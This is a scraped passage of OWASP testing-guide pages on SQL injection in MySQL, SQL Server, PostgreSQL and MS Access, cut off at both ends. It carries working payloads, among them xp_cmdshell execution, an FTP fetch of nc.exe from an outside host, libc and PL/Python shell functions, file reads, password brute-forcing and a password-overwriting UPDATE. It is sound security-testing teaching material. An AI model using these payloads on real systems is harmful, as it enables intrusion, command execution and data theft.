to throw an error. A list of errors thrown by MySQL and in particular native functions could be found on [MySQL Manual](https://dev.mysql.com/doc/mysql-errors/8.0/en/server-error-reference.html).\n\n### Out of Band SQL Injection\n\nOut of band injection could be accomplished by using the [`into outfile`](#write-in-a-file) clause.\n\n### Blind SQL Injection\n\nFor blind SQL injection, there is a set of useful function natively provided by MySQL server.\n\n- String Length:\n    - `LENGTH(str)`\n- Extract a substring from a given string:\n    - `SUBSTRING(string, offset, #chars_returned)`\n- Time based Blind Injection:\n    - BENCHMARK and SLEEP `BENCHMARK(#ofcycles,action_to_be_performed)`\n    The benchmark function could be used to perform timing attacks when blind injection by boolean values does not yield any results.\n    See. `SLEEP()` (MySQL > 5.0.x) for an alternative on benchmark.\n\nFor a complete list, refer to the [MySQL manual](https://dev.mysql.com/doc/refman/8.0/en/functions.html)\n\n## Tools\n\n- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)\n- [Muhaimin Dzulfakar: MySqloit, MySql Injection takeover tool](https://code.google.com/archive/p/mysqloit/)\n\n## References\n\n### Whitepapers\n\n- [Chris Anley: \"Hackproofing MySQL\"](https://www.securitylab.ru/_Article_Images/2004/HackproofingMySQL.pdf)\n\n### Case Studies\n\n- [Zeelock: Blind Injection in MySQL Databases](https://archive.cert.uni-stuttgart.de/bugtraq/2005/02/msg00289.html)\n", "timestamp": "2025-10-24T11:39:51.961475"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.3-Testing_for_SQL_Server.md", "content": "# Testing for SQL Server\n\n## Summary\n\nIn this section some [SQL Injection](https://owasp.org/www-community/attacks/SQL_Injection) techniques that utilize specific features of Microsoft SQL Server will be discussed.\n\nSQL injection vulnerabilities occur whenever input is used in the construction of an SQL query without being adequately constrained or sanitized. The use of dynamic SQL (the construction of SQL queries by concatenation of strings) opens the door to these vulnerabilities. SQL injection allows an attacker to access the SQL servers and execute SQL code under the privileges of the user used to connect to the database.\n\nAs explained in [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection), a SQL-injection exploit requires two things: an entry point, and an exploit to enter. Any user-controlled parameter that gets processed by the application might be hiding a vulnerability. This includes:\n\n- Application parameters in query strings (e.g., GET requests)\n- Application parameters included as part of the body of a POST request\n- Browser-related information (e.g., user-agent, referrer)\n- Host-related information (e.g., hostname, IP)\n- Session-related information (e.g., user ID, cookies)\n\nMicrosoft SQL server has a few unique characteristics, so some exploits need to be specially customized for this application.\n\n## How to Test\n\n### SQL Server Characteristics\n\nTo begin, let's see some SQL Server operators and commands/stored procedures that are useful in a SQL Injection test:\n\n- comment operator: `--` (useful for forcing the query to ignore the remaining portion of the original query; this won't be necessary in every case)\n- query separator: `;` (semicolon)\n- Useful stored procedures include:\n    - [xp_cmdshell](https://docs.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) executes any command shell in the server with the same permissions that it is currently running. By default, only `sysadmin` is allowed to use it and in SQL Server 2005 it is disabled by default (it can be enabled again using sp_configure)\n    - `xp_regread` reads an arbitrary value from the Registry (undocumented extended procedure)\n    - `xp_regwrite` writes an arbitrary value into the Registry (undocumented extended procedure)\n    - [sp_makewebtask](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) Spawns a Windows command shell and passes in a string for execution. Any output is returned as rows of text. It requires `sysadmin` privileges.\n    - [xp_sendmail](https://docs.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) Sends an email message, which may include a query result set attachment, to the specified recipients. This extended stored procedure uses SQL Mail to send the message.\n\nLet's see now some examples of specific SQL Server attacks that use the aforementioned functions. Most of these examples will use the `exec` function.\n\nBelow we show how to execute a shell command that writes the output of the command `dir c:\\inetpub` in a browseable file, assuming that the web server and the DB server reside on the same host. The following syntax uses `xp_cmdshell`:\n\n`exec master.dbo.xp_cmdshell 'dir c:\\inetpub > c:\\inetpub\\wwwroot\\test.txt'--`\n\nAlternatively, we can use `sp_makewebtask`:\n\n`exec sp_makewebtask 'C:\\Inetpub\\wwwroot\\test.txt', 'select * from master.dbo.sysobjects'--`\n\nA successful execution will create a file that can be browsed by the pen tester. Keep in mind that `sp_makewebtask` is deprecated, and, even if it works in all SQL Server versions up to 2005, it might be removed in the future.\n\nIn addition, SQL Server built-in functions and environment variables are very handy. The following uses the function `db_name()` to trigger an error that will return the name of the database:\n\n`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`\n\nNotice the use of [convert](https://docs.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql?view=sql-server-2017):\n\n`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`\n\n`CONVERT` will try to convert the result of `db_name` (a string) into an integer variable, triggering an error, which, if displayed by the vulnerable application, will contain the name of the DB.\n\nThe following example uses the environment variable `@@version`, combined with a `union select`-style injection, in order to find the version of the SQL Server.\n\n`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`\n\nAnd here's the same attack, but using again the conversion trick:\n\n`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`\n\nInformation gathering is useful for exploiting software vulnerabilities at the SQL Server, through the exploitation of an SQL-injection attack or direct access to the SQL listener.\n\nIn the following, we show several examples that exploit SQL injection vulnerabilities through different entry points.\n\n### Example 1: Testing for SQL Injection in a GET Request\n\nThe most simple (and sometimes most rewarding) case would be that of a login page requesting an username and password for user login. You can try entering the following string \"' or '1'='1\" (without double quotes):\n\n`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`\n\nIf the application is using Dynamic SQL queries, and the string gets appended to the user credentials validation query, this may result in a successful login to the application.\n\n### Example 2: Testing for SQL Injection in a GET Request\n\nIn order to learn how many columns exist\n\n`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`\n\n### Example 3: Testing in a POST Request\n\nSQL Injection, HTTP POST Content: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`\n\nA complete post example (`https://vulnerable.web.app/forgotpass.asp`):\n\n```txt\nPOST /forgotpass.asp HTTP/1.1\nHost: vulnerable.web.app\n[...]\nReferer: https://vulnerable.web.app/forgotpass.asp\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 50\n\nemail=%27&whichSubmit=submit&submit.x=0&submit.y=0\n```\n\nThe error message obtained when a `'` (single quote) character is entered at the email field is:\n\n```txt\nMicrosoft OLE DB Provider for SQL Server error '80040e14'\nUnclosed quotation mark before the character string '' '.\n/forgotpass.asp, line 15\n```\n\n### Example 4: Yet Another (Useful) GET Example\n\nObtaining the application's source code\n\n`a' ; master.dbo.xp_cmdshell ' copy c:\\inetpub\\wwwroot\\login.aspx c:\\inetpub\\wwwroot\\login.txt';--`\n\n### Example 5: Custom `xp_cmdshell`\n\nAll books and papers describing the security best practices for SQL Server recommend disabling `xp_cmdshell` in SQL Server 2000 (in SQL Server 2005 it is disabled by default). However, if we have sysadmin rights (natively or by bruteforcing the sysadmin password, see below), we can often bypass this limitation.\n\nOn SQL Server 2000:\n\n- If `xp_cmdshell` has been disabled with `sp_dropextendedproc`, we can simply inject the following code:\n\n`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`\n\n- If the previous code does not work, it means that the `xp_log70.dll` has been moved or deleted. In this case we need to inject the following code:\n\n```sql\nCREATE PROCEDURE xp_cmdshell(@cmd varchar(255), @Wait int = 0) AS\n    DECLARE @result int, @OLEResult int, @RunResult int\n    DECLARE @ShellID int\n    EXECUTE @OLEResult = sp_OACreate 'WScript.Shell', @ShellID OUT\n    IF @OLEResult <> 0 SELECT @result = @OLEResult\n    IF @OLEResult <> 0 RAISERROR ('CreateObject %0X', 14, 1, @OLEResult)\n    EXECUTE @OLEResult = sp_OAMethod @ShellID, 'Run', Null, @cmd, 0, @Wait\n    IF @OLEResult <> 0 SELECT @result = @OLEResult\n    IF @OLEResult <> 0 RAISERROR ('Run %0X', 14, 1, @OLEResult)\n    EXECUTE @OLEResult = sp_OADestroy @ShellID\n    return @result\n```\n\nThis code, written by Antonin Foller (see links at the bottom of the page), creates a new `xp_cmdshell` using `sp_oacreate`, `sp_oamethod` and `sp_oadestroy` (as long as they haven't been disabled too, of course). Before using it, we need to delete the first `xp_cmdshell` we created (even if it was not working), otherwise the two declarations will collide.\n\nOn SQL Server 2005, `xp_cmdshell` can be enabled by injecting the following code instead:\n\n```sql\nmaster..sp_configure 'show advanced options',1\nreconfigure\nmaster..sp_configure 'xp_cmdshell',1\nreconfigure\n```\n\n### Example 6: Referer / User-Agent\n\nThe `REFERER` header set to:\n\n`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`\n\nAllows the execution of arbitrary SQL Code. The same happens with the User-Agent header set to:\n\n`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`\n\n### Example 7: SQL Server as a Port Scanner\n\nIn SQL Server, one of the most useful (at least for the penetration tester) commands is OPENROWSET, which is used to run a query on another DB Server and retrieve the results. The penetration tester can use this command to scan ports of other machines in the target network, injecting the following query:\n\n`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`\n\nThis query will attempt a connection to the address x.y.w.z on port p. If the port is closed, the following message will be returned:\n\n`SQL Server does not exist or access denied`\n\nOn the other hand, if the port is open, one of the following errors will be returned:\n\n`General network error. Check your network documentation`\n\n`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`\n\nOf course, the error message is not always available. If that is the case, we can use the response time to understand what is going on: with a closed port, the timeout (5 seconds in this example) will be consumed, whereas an open port will return the result right away.\n\nKeep in mind that OPENROWSET is enabled by default in SQL Server 2000 but disabled in SQL Server 2005.\n\n### Example 8: Upload of Executables\n\nOnce we can use `xp_cmdshell` (either the native one or a custom one), we can easily upload executables on the target DB Server. A very common choice is `netcat.exe`, but any trojan will be useful here. If the target is allowed to start FTP connections to the tester's machine, all that is needed is to inject the following queries:\n\n```sql\nexec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--\nexec master..xp_cmdshell 'echo USER >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo bin >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--\nexec master..xp_cmdshell 'echo quit >> ftpscript.txt';--\nexec master..xp_cmdshell 'ftp -s:ftpscript.txt';--\n```\n\nAt this point, `nc.exe` will be uploaded and available.\n\nIf FTP is not allowed by the firewall, we have a workaround that exploits the Windows debugger, `debug.exe`, that is installed by default in all Windows machines. `Debug.exe` is scriptable and is able to create an executable by executing an appropriate script file. What we need to do is to convert the executable into a debug script (which is a 100% ASCII file), upload it line by line and finally call `debug.exe` on it. There are several tools that create such debug files (e.g.: `makescr.exe` by Ollie Whitehouse and `dbgtool.exe` by `toolcrypt.org`). The queries to inject will therefore be the following:\n\n```sql\nexec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--\nexec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--\n....\nexec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--\nexec master..xp_cmdshell 'debug.exe < debugscript.txt';--\n```\n\nAt this point, our executable is available on the target machine, ready to be executed. There are tools that automate this process, most notably `Bobcat`, which runs on Windows, and `Sqlninja`, which runs on Unix (See the tools at the bottom of this page).\n\n### Obtain Information When It Is Not Displayed (Out of Band)\n\nNot all is lost when the web application does not return any information --such as descriptive error messages (cf. [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). For example, it might happen that one has access to the source code (e.g., because the web application is based on an open source software). Then, the pen tester can exploit all the SQL injection vulnerabilities discovered offline in the web application. Although an IPS might stop some of these attacks, the best way would be to proceed as follows: develop and test the attacks in a testbed created for that purpose, and then execute these attacks against the web application being tested.\n\nOther options for out of band attacks are described in [Sample 4 above](#example-4-yet-another-useful-get-example).\n\n### Blind SQL Injection Attacks\n\n#### Trial and Error\n\nAlternatively, one may play lucky. That is the attacker may assume that there is a blind or out-of-band SQL injection vulnerability in a the web application. He will then select an attack vector (e.g., a web entry), [use fuzz vectors](../../6-Appendix/C-Fuzz_Vectors.md) against this channel and watch the response. For example, if the web application is looking for a book using a query\n\n```sql\nselect * from books where title=\"text entered by the user\"\n```\n\nthen the penetration tester might enter the text: `'Bomba' OR 1=1-` and if data is not properly validated, the query will go through and return the whole list of books. This is evidence that there is a SQL injection vulnerability. The penetration tester might later `play` with the queries in order to assess the criticality of this vulnerability.\n\n> **_NOTE:_**  Take care when injecting the condition OR 1=1 into a SQL query. Although this may be harmless in the initial context you're injecting into, it's common for applications to use data from a single request in multiple different queries. If your condition reaches an UPDATE or DELETE statement, for example, this can result in an accidental loss of data.\n\n#### If Multiple Error Messages Displayed\n\nOn the other hand, if no prior information is available, there is still a possibility of attacking by exploiting any `covert channel`. It might happen that descriptive error messages are stopped, yet the error messages give some information. For example:\n\n- In some cases the web application (actually the web server) might return the traditional `500: Internal Server Error`, say when the application returns an exception that might be generated, for instance, by a query with unclosed quotes.\n- While in other cases the server will return a `200 OK` message, but the web application will return some error message inserted by the developers `Internal server error` or `bad data`.\n\nThis one bit of information might be enough to understand how the dynamic SQL query is constructed by the web application and tune up an exploit. Another out-of-band method is to output the results through HTTP browseable files.\n\n#### Timing Attacks\n\nThere is one more possibility for making a blind SQL injection attack when there is not visible feedback from the application: by measuring the time that the web application takes to answer a request. An attack of this sort is [described by Anley](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf) from where we take the next examples. A typical approach uses the `waitfor delay` command: let's say that the attacker wants to check if the `pubs` sample database exists, he will simply inject the following command:\n\n`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`\n\nDepending on the time that the query takes to return, we will know the answer. In fact, what we have here is two things: a `SQL injection vulnerability` and a `covert channel` that allows the penetration tester to get 1 bit of information for each query. Hence, using several queries (as many queries as bits in the required information) the pen tester can get any data that is in the database. Look at the following query\n\n```sql\ndeclare @s varchar(8000)\ndeclare @i int\nselect @s = db_name()\nselect @i = [some value]\nif (select len(@s)) < @i waitfor delay '0:0:5'\n```\n\nMeasuring the response time and using different values for `@i`, we can deduce the length of the name of the current database, and then start to extract the name itself with the following query:\n\n`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`\n\nThis query will wait for 5 seconds if bit `@bit` of byte `@byte` of the name of the current database is 1, and will return at once if it is 0. Nesting two cycles (one for `@byte` and one for `@bit`) we will we able to extract the whole piece of information.\n\nHowever, it might happen that the command `waitfor` is not available (e.g., because it is filtered by an IPS/web application firewall). This doesn't mean that blind SQL injection attacks cannot be done, as the pen tester should only come up with any time consuming operation that is not filtered. For example\n\n```sql\ndeclare @i int select @i = 0\nwhile @i < 0xaffff begin\nselect @i = @i + 1\nend\n```\n\n#### Checking for Version and Vulnerabilities\n\nThe same timing approach can be used also to understand which version of SQL Server we are dealing with. Of course we will leverage the built-in `@@version` variable. Consider the following query:\n\n`select @@version`\n\nOn SQL Server 2005, it will return something like the following:\n\n`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`\n\nThe `2005` part of the string spans from the 22nd to the 25th character. Therefore, one query to inject can be the following:\n\n`if substring((select @@version),25,1) = 5 waitfor delay '0:0:5'`\n\nSuch query will wait 5 seconds if the 25th character of the `@@version` variable is `5`, showing us that we are dealing with a SQL Server 2005. If the query returns immediately, we are probably dealing with SQL Server 2000, and another similar query will help to clear all doubts.\n\n### Example 9: Bruteforce of Sysadmin Password\n\nTo bruteforce the sysadmin password, we can leverage the fact that `OPENROWSET` needs proper credentials to successfully perform the connection and that such a connection can also be \"looped\" to the local DB Server. Combining these features with an inference injection attack based on response timing, we can inject the following code:\n\n`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`\n\nWhat we are doing here is attempting a connection to the local database (specified by the empty field after `SQLOLEDB`) using `sa` and `<pwd>` as credentials. If the password is correct and the connection is successful, the query is executed, making the DB wait for 5 seconds (and also returning a value, since OPENROWSET expects at least one column). Fetching the candidate passwords from a wordlist and measuring the time needed for each connection, we can attempt to guess the correct password. In \"Data-mining with SQL Injection and Inference\", David Litchfield pushes this technique even further, by injecting a piece of code in order to bruteforce the sysadmin password using the CPU resources of the DB Server itself.\n\nOnce we have the sysadmin password, we have two choices:\n\n- Inject all following queries using `OPENROWSET`, in order to use sysadmin privileges\n- Add our current user to the sysadmin group using `sp_addsrvrolemember`. The current username can be extracted using inference injection against the variable `system_user`.\n\nRemember that OPENROWSET is accessible to all users on SQL Server 2000 but it is restricted to administrative accounts on SQL Server 2005.\n\n## Tools\n\n- [Bernardo Damele A. G.: sqlmap, automatic SQL injection tool](https://sqlmap.org/)\n\n## References\n\n### Whitepapers\n\n- [David Litchfield: \"Data-mining with SQL Injection and Inference\"](https://dl.packetstormsecurity.net/papers/attack/sqlinference.pdf)\n- [Chris Anley, \"(more) Advanced SQL Injection\"](https://www.cgisecurity.com/lib/more_advanced_sql_injection.pdf)\n- [Alexander Chigrik: \"Useful undocumented extended stored procedures\"](https://www.databasejournal.com/features/mssql/article.php/1441251/Useful-Undocumented-Extended-Stored-Procedures.htm)\n- [Antonin Foller: \"Custom xp_cmdshell, using shell object\"](https://www.motobit.com/tips/detpg_cmdshell)\n- [SQL Injection](https://www.cisecurity.org/wp-content/uploads/2017/05/SQL-Injection-White-Paper.pdf)\n- [Cesar Cerrudo: Manipulating Microsoft SQL Server Using SQL Injection, uploading files, getting into internal network, port scanning, DOS](https://www.cgisecurity.com/lib/Manipulating_SQL_Server_Using_SQL_Injection.pdf)\n", "timestamp": "2025-10-24T11:39:52.057429"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.4-Testing_PostgreSQL.md", "content": "# Testing PostgreSQL\n\n## Summary\n\nIn this section, some SQL Injection techniques for PostgreSQL will be discussed. These techniques have the following characteristics:\n\n- PHP Connector allows multiple statements to be executed by using `;` as a statement separator\n- SQL Statements can be truncated by appending the comment char: `--`.\n- `LIMIT` and `OFFSET` can be used in a `SELECT` statement to retrieve a portion of the result set generated by the `query`\n\nFrom now on it is assumed that `https://www.example.com/news.php?id=1` is vulnerable to SQL Injection attacks.\n\n## How to Test\n\n### Identifying PostgreSQL\n\nWhen a SQL Injection has been found, you need to carefully fingerprint the backend database engine. You can determine that the backend database engine is PostgreSQL by using the *::* cast operator.\n\n#### Examples\n\n`https://www.example.com/store.php?id=1 AND 1::int=1`\n\nIn addition, the function *version()* can be used to grab the PostgreSQL banner. This will also show the underlying operating system type and version.\n\n##### Example\n\n`https://www.example.com/store.php?id=1 UNION ALL SELECT NULL,version(),NULL LIMIT 1 OFFSET 1--`\n\nAn example of a banner string that could be returned is:\n\n`PostgreSQL 8.3.1 on i486-pc-linux-gnu, compiled by GCC cc (GCC) 4.2.3 (Ubuntu 4.2.3-2ubuntu4)`\n\n### Blind Injection\n\nFor blind SQL injection attacks, you should take into consideration the following built-in functions:\n\n- String Length\n`LENGTH(str)`\n\n- Extract a substring from a given string\n`SUBSTR(str,index,offset)`\n\n- String representation with no single quotes\n`CHR(104)||CHR(101)||CHR(108)||CHR(108)||CHR(111)`\n\nStarting at version 8.2, PostgreSQL introduced a built-in function, `pg_sleep(n)`, to make the current session process sleep for `n` seconds. This function can be leveraged to execute timing attacks (discussed in detail at [Blind SQL Injection](https://owasp.org/www-community/attacks/Blind_SQL_Injection)).\n\nIn addition, you can easily create a custom `pg_sleep(n)` in previous versions by using libc:\n\n- `CREATE function pg_sleep(int) RETURNS int AS '/lib/libc.so.6', 'sleep' LANGUAGE 'C' STRICT`\n\n### Single Quote Unescape\n\nStrings can be encoded, to prevent single quotes escaping, by using `chr()` function.\n\n- `chr(n)`: Returns the character whose ASCII value corresponds to the number `n`\n- `ascii(n)`: Returns the ASCII value which corresponds to the character `n`\n\nLet's say you want to encode the string 'root':\n\n```sql\nselect ascii('r')\n114\nselect ascii('o')\n111\nselect ascii('t')\n116\n```\n\nWe can encode 'root' as:\n\n`chr(114)||chr(111)||chr(111)||chr(116)`\n\n#### Example\n\n`https://www.example.com/store.php?id=1; UPDATE users SET PASSWORD=chr(114)||chr(111)||chr(111)||chr(116)--`\n\n### Attack Vectors\n\n#### Current User\n\nThe identity of the current user can be retrieved with the following SQL SELECT statements:\n\n```sql\nSELECT user\nSELECT current_user\nSELECT session_user\nSELECT usename FROM pg_user\nSELECT getpgusername()\n```\n\n##### Example\n\n```text\nhttps://www.example.com/store.php?id=1 UNION ALL SELECT user,NULL,NULL--\nhttps://www.example.com/store.php?id=1 UNION ALL SELECT current_user, NULL, NULL--\n```\n\n#### Current Database\n\nThe built-in function current\\_database() returns the current database name.\n\n##### Example\n\n`https://www.example.com/store.php?id=1 UNION ALL SELECT current_database(),NULL,NULL--`\n\n#### Reading from a File\n\nPostgreSQL provides two ways to access a local file:\n\n- `COPY` statement\n- `pg_read_file()` internal function (starting from PostgreSQL 8.1)\n\n##### COPY\n\nThis operator copies data between a file and a table. The PostgreSQL engine accesses the local file system as the `postgres` user.\n\n###### Example\n\n```text\n/store.php?id=1; CREATE TABLE file_store(id serial, data text)--\n/store.php?id=1; COPY file_store(data) FROM '/var/lib/postgresql/.psql_history'--\n```\n\nData should be retrieved by performing a `UNION Query SQL Injection`:\n\n- retrieves the number of rows previously added in `file_store` with `COPY` statement\n- retrieves a row at a time with UNION SQL Injection\n\n```text\n/store.php?id=1 UNION ALL SELECT NULL, NULL, max(id)::text FROM file_store LIMIT 1 OFFSET 1;--\n/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 1;--\n/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 2;--\n...\n...\n/store.php?id=1 UNION ALL SELECT data, NULL, NULL FROM file_store LIMIT 1 OFFSET 11;--\n```\n\n##### pg_read_file()\n\nThis function was introduced in `PostgreSQL 8.1` and allows one to read arbitrary files located inside DBMS data directory.\n\n###### Example\n\n`SELECT pg_read_file('server.key',0,1000);`\n\n#### Writing to a File\n\nBy reverting the COPY statement, we can write to the local file system with the `postgres` user rights\n\n`/store.php?id=1; COPY file_store(data) TO '/var/lib/postgresql/copy_output'--`\n\n#### Shell Injection\n\nPostgreSQL provides a mechanism to add custom functions by using both Dynamic Library and scripting languages such as python, perl, and tcl.\n\n##### Dynamic Library\n\nUntil PostgreSQL 8.1, it was possible to add a custom function linked with `libc`:\n\n`CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6', 'system' LANGUAGE 'C' STRICT`\n\nSince `system` returns an `int` how we can fetch results from `system` stdout?\n\nHere's a little trick:\n\n- create a `stdout` table: `CREATE TABLE stdout(id serial, system_out text)`\n- executing a shell command redirecting its `stdout`: `SELECT system('uname -a > /tmp/test')`\n- use a `COPY` statements to push output of previous command in `stdout` table: `COPY stdout(system_out) FROM '/tmp/test*'`\n- retrieve output from `stdout`: `SELECT system_out FROM stdout`\n\n###### Example\n\n```text\n/store.php?id=1; CREATE TABLE stdout(id serial, system_out text) --\n/store.php?id=1; CREATE FUNCTION system(cstring) RETURNS int AS '/lib/libc.so.6','system' LANGUAGE 'C'\nSTRICT --\n/store.php?id=1; SELECT system('uname -a > /tmp/test') --\n/store.php?id=1; COPY stdout(system_out) FROM '/tmp/test' --\n/store.php?id=1 UNION ALL SELECT NULL,(SELECT system_out FROM stdout ORDER BY id DESC),NULL LIMIT 1 OFFSET 1--\n```\n\n##### Plpython\n\nPL/Python allows users to code PostgreSQL functions in python. It's untrusted so there is no way to restrict what user can do. It's not installed by default and can be enabled on a given database by `CREATELANG`\n\n- Check if PL/Python has been enabled on a database: `SELECT count(*) FROM pg_language WHERE lanname='plpythonu'`\n- If not, try to enable: `CREATE LANGUAGE plpythonu`\n- If either of the above succeeded, create a proxy shell function: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'import os; return os.popen(args[0]).read() 'LANGUAGE plpythonu`\n- Have fun with: `SELECT proxyshell(os command);`\n\n###### Example\n\n- Create a proxy shell function: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS ‘import os;return os.popen(args[0]).read()’ LANGUAGE plpythonu;--`\n- Run an OS Command: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`\n\n##### Plperl\n\nPlperl allows us to code PostgreSQL functions in perl. Normally, it is installed as a trusted language in order to disable runtime execution of operations that interact with the underlying operating system, such as `open`. By doing so, it's impossible to gain OS-level access. To successfully inject a proxyshell like function, we need to install the untrusted version from the `postgres` user, to avoid the so-called application mask filtering of trusted/untrusted operations.\n\n- Check if PL/perl-untrusted has been enabled: `SELECT count(*) FROM pg_language WHERE lanname='plperlu'`\n- If not, assuming that sysadm has already installed the plperl package, try: `CREATE LANGUAGE plperlu`\n- If either of the above succeeded, create a proxy shell function: `CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,\"$_[0] |\");return join(\"\",<FD>);' LANGUAGE plperlu`\n- Have fun with: `SELECT proxyshell(os command);`\n\n###### Example\n\n- Create a proxy shell function: `/store.php?id=1; CREATE FUNCTION proxyshell(text) RETURNS text AS 'open(FD,\"$_[0] |\");return join(\"\",<FD>);' LANGUAGE plperlu;`\n- Run an OS Command: `/store.php?id=1 UNION ALL SELECT NULL, proxyshell('whoami'), NULL OFFSET 1;--`\n\n## References\n\n- [Testing for SQL Injection](05-Testing_for_SQL_Injection.md)\n- [SQL Injection Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html)\n- [PostgreSQL Official Documentation](https://www.postgresql.org/docs/)\n- [Bernardo Damele and Daniele Bellucci: sqlmap, a blind SQL injection tool](https://sqlmap.org/)\n", "timestamp": "2025-10-24T11:39:52.158736"}
{"source": "github", "repo": "OWASP/wstg", "file": "document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md", "url": "https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/05.5-Testing_for_MS_Access.md", "content": "# Testing for MS Access\n\n## Summary\n\nAs explained in the generic [SQL injection](https://owasp.org/www-community/attacks/SQL_Injection) section, SQL injection vulnerabilities occur whenever user-supplied input is used during the construction of a SQL query without being adequately constrained or sanitized. This class of vulnerabilities allows an attacker to execute SQL code under the privileges of the user that is used to connect to the database. In this section, relevant SQL injection techniques that utilize specific features of [Microsoft Access](https://en.wikipedia.org/wiki/Microsoft_Access) will be discussed.\n\n## How to Test\n\n### Fingerprinting\n\nFingerprinting the specific database technology while testing SQL-powered application is the first step to properly asses potential vulnerabilities. A common approach involves injecting standard SQL injection attack patterns (e.g. single quote, double quote, ...) in order to trigger database exceptions. Assuming that the application does not handle exceptions with custom pages, it is possible to fingerprint the underline DBMS by observing error messages.\n\nDepending on the specific web technology used, MS Access driven applications will respond with one of the following errors:\n\n`Fatal error: Uncaught exception 'com_exception' with message Source: Microsoft JET Database Engine`\n\nor\n\n`Microsoft JET Database Engine error '80040e14'`\n\nor\n\n`Microsoft Office Access Database Engine`\n\nIn all cases, we have a confirmation that we're testing an application using MS Access database.\n\n### Basic Testing\n\nUnfortunately, MS Access doesn't support typical operators that are traditionally used during SQL injection testing, including:\n\n- No comments characters\n- No stacked queries\n- No LIMIT operator\n- No SLEEP or BENCHMARK alike operators\n- and many others\n\nNevertheless, it is possible to emulate those functions by combining multiple operators or by using alternative techniques. As mentioned, it is not possible to use the trick of inserting the characters `/*`, `--` or `#` in order to truncate the query. However, we can fortunately bypass this limitation by injecting a 'null' character. Using a null byte `%00` within a SQL query results in MS Access ignoring all remaining characters. This can be explained by considering that all strings are NULL terminated in the internal representation used by the database. It is worth mentioning that the `null` character can sometimes cause troubles too as it may truncate strings at the web server level. In those situations, we can however employ another character: `0x16` (`%16` in URL encoded format).\n\nConsidering the following query:\n\n`SELECT [username],[password] FROM users WHERE [username]='$myUsername' AND [password]='$myPassword'`\n\nWe can truncate the query with the following two URLs:\n\n- `https://www.example.com/page.asp?user=admin'%00&pass=foo`\n- `https://www.example.com/page.app?user=admin'%16&pass=foo`\n\nThe `LIMIT` operator is not implemented in MS Access, however it is possible to limit the number of results by using the `TOP` or `LAST` operators instead.\n\n`https://www.example.com/page.app?id=2'+UNION+SELECT+TOP+3+name+FROM+appsTable%00`\n\nBy combining both operators, it is possible to select specific results. String concatenation is possible by using `& (%26)` and `+ (%2b)` characters.\n\nThere are also many other functions that can be used while testing SQL injection, including but not limited to:\n\n- ASC: Obtain the ASCII value of a character passed as input\n- CHR: Obtain the character of the ASCII value passed as input\n- LEN: Return the length of the string passed as parameter\n- IIF: Is the IF construct, for example the following statement `IIF(1=1, 'a', 'b')` return `a`\n- MID: This function allows you to extract substring, for example the following statement `mid('abc',1,1)` return `a`\n- TOP: This function allows you to specify the maximum number of results that the query should return from the top. For example `TOP 1` will return only 1 row.\n- LAST: This function is used to select only the last row of a set of rows. For example the following query `SELECT last(*)` FROM users will return only the last row of the result.\n\nSome of these operators are 